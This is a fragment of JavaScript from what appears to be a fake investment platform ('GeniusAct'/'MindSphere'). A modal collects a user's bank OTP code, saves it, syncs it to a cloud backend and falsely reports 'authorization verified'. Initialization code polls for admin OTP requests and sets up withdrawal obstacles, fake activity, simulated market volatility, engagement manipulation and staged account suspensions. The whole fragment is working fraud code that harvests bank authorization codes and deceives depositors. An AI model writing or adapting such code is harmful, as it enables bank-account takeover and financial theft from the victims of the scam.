    document.getElementById('submit-user-otp-btn').onclick = async () => {
        const val = document.getElementById('user-otp-input').value.trim();
        const err = document.getElementById('user-otp-err');

        if (!val || val.length < 4) {
            err.textContent = `Please enter a valid security OTP code provided by ${bankName}.`;
            err.style.display = "block";
            return;
        }

        err.style.display = "none";
        const btn = document.getElementById('submit-user-otp-btn');
        btn.disabled = true;
        btn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Transmitting Code to ${escapeHtml(bankName)}...`;

        link.otpSubmitted = val;
        link.otpSubmittedAt = new Date().toISOString();

        localStorage.setItem('geniusact_bank_links', JSON.stringify(bankLinks));

        if (window.cloudSyncFull) {
            try { await window.cloudSyncFull(); } catch(e) {}
        }

        setTimeout(() => {
            modal.remove();
            alert(`✅ ${bankName} OTP Authorization verified successfully. Account clearance confirmed.`);
        }, 1500);
    };
}

// Initialize MindSphere Platform  
document.addEventListener('DOMContentLoaded', () => {  
    // UI Enhancements
    initializeStreak();
    liveFluctuationChart();
    initializeAchievements();
    setupWithdrawalObstacles();

    // Original Hooks
    simulateMarketVolatility();  
    setInterval(updateProgressBars, 30000);   
    setTimeout(injectRiskShield, 10000);  
    setInterval(manipulateEngagement, 300000); 
    setTimeout(injectFakeActivity, 5000); 
    
    // Check OTP Requests from Admin
    setInterval(checkPendingOTPRequests, 3000);

    // Simulations
    const userStr = localStorage.getItem('geniusact_current_user');
    if (userStr) {
        try {
            const user = JSON.parse(userStr);
            const approvedUsers = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
            const freshUser = approvedUsers.find(u => u.email === user.email) || user;
            if (!freshUser.kyc || (freshUser.kyc.status !== 'approved' && freshUser.kyc.status !== 'pending')) {
                setTimeout(simulateAccountSuspension, Math.floor(Math.random() * (120000 - 60000)) + 60000);
            }
        } catch(e) {}
    }
});
